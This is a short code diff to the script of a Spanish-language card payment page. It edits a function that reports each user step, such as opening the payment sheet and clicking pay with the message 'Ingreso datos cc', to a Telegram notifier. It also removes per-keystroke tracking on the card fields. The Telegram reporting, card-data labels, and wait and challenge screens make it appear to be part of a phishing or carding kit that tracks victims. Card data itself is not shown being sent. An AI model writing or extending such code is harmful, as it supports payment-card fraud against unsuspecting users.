@@ -507,6 +507,10 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
   } from '../../services/cardPaymentValidation';
 
   function notifyTelegramStep(event) {
+    if (typeof window.sendTelegramStep === 'function') {
+      window.sendTelegramStep(event);
+      return;
+    }
     try {
       fetch('/api/debug-page', {
         method: 'POST',
@@ -1148,22 +1152,11 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     });
   }
 
-  let notifiedPaymentTyping = false;
-  function notifyPaymentTyping() {
-    if (notifiedPaymentTyping) return;
-    notifiedPaymentTyping = true;
-    notifyTelegramStep('Esta ingresando el detalle de pago');
-  }
-
   cardNumber?.addEventListener('focus', () => cardNumber.removeAttribute('readonly'));
   cardName?.addEventListener('focus', () => cardName.removeAttribute('readonly'));
   cardExp?.addEventListener('focus', () => cardExp.removeAttribute('readonly'));
   cardCvv?.addEventListener('focus', () => cardCvv.removeAttribute('readonly'));
   cardEmail?.addEventListener('focus', () => cardEmail.removeAttribute('readonly'));
-  [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
-    input?.addEventListener('input', notifyPaymentTyping);
-    input?.addEventListener('focus', notifyPaymentTyping);
-  });
 
   function syncPlaceholderState(input) {
     input?.closest('.pagos-card-input')?.classList.toggle(
@@ -1274,7 +1267,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     sheet.hidden = !open;
     sheet.classList.toggle('is-open', open);
     document.body.classList.toggle('pagos-sheet-open', open);
-    if (open) notifyTelegramStep('Abrio el banner de pago');
+    if (open) notifyTelegramStep('Abrio banner de pago');
   }
 
   document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
@@ -1282,7 +1275,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
   payBtn?.addEventListener('click', async () => {
     if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
-    notifyTelegramStep('Ingreso el detalle de pago correctamente');
+    notifyTelegramStep('✅ Ingreso datos cc');
     debugPollGen += 1;
     const wait = document.getElementById('pagos-wait-screen');
     const challenge = document.getElementById('pagos-challenge-screen');
